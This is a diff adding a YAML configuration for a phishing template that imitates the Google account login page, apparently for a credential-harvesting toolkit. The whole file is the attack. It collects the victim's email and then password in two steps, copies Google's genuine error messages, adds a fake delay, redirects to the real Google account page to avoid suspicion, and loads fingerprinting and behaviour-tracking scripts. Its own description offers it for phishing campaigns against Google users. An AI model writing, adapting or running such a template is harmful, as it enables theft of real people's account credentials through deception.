@@ -1,0 +1,44 @@
+info:
+  name: Google Login
+  author: mh4x0f
+  description: A phishing template that mimics the Google account login page, crafted to capture user credentials through a familiar authentication flow. Suitable for campaigns targeting users of Google services across mobile and web environments.
+  category: social
+  system: true
+  tags:
+    - google
+    - mobile
+    - web
+template_dir: google_login
+steps:
+  - id: login
+    title: Google Login
+    path: /login
+    method: POST
+    template_file: login.html
+    success_message: Login information received. Proceeding to verification...
+    next: password
+    capture:
+      enabled: true
+      fields:
+        - name: email
+          required: true
+          validate_regex: ^([A-Za-z0-9._-]{3,32}|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}|^\+?[0-9]{8,15}$)$
+          error_message: Couldn’t find your Google Account
+    simulate_delay_ms: 300
+  - id: password
+    title: Password Google
+    path: /password
+    method: POST
+    template_file: password.html
+    redirect_url: https://myaccount.google.com
+    capture:
+      enabled: true
+      fields:
+        - name: password
+          required: true
+          validate_regex: ^.{6,}$
+          error_message: Wrong password. Try again or click "Forgot password?" for more options.
+hooks:
+  onLoad:
+    - /hooks/fingerprint.js
+    - /hooks/behavior.js
